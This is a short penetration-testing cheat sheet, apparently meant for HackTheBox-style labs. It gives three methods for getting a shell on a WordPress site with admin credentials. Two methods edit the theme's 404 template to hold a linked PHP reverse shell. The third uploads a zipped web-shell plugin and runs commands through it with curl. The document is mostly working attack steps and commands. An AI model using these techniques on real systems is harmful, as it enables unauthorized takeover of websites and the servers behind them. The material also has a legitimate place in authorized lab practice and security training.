- - -
## Method 1 : 

🎃️ Modifying a php from the theme used (admin credentials needed)
🦴️ Appearance ➡️ Editor ➡️ 404 Template ( **at the right** )
👹️ Change the content for a php shell

Use this Reverse shell : [shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

Start a listener and Now provoke the Shell  : 
```http
http://target.htb/wp-content/themes/twentytwelve/404.php
```

- - -
## Method 2 : 

💥️ Go to :
				💢️ “**Tools**” 👉️ “**Theme File Editor**”.
💥️ Switch to Twenty Tweny one theme.
💥️ Click on 404 Template.
💥️ Don't remove every-thing just add your php shell inside it but remove your ``<?php** and **?>**.``
💥️ Save it.
💥️ Set-up a listner.
💥️ GO to :
				💢️ “**Appereance**” 👉️ “**Themes** ”.
💥️ Activate the "**Twenty Twenty one**" Theme.
💥️ Now visit any page that does not exist and have a shell.

- - -
## Method 3 : 

```sh
cp /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php .
```

```sh
zip plugin-shell.zip plugin-shell.php
```

Upload plugin-shell.zip (Plugins > Add New)
and install it (Upload Plugin > Browse... > Install Now)
but do not activate! Now you can access the web shell:

```sh
curl 'http://10.10.13.37/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami'
```

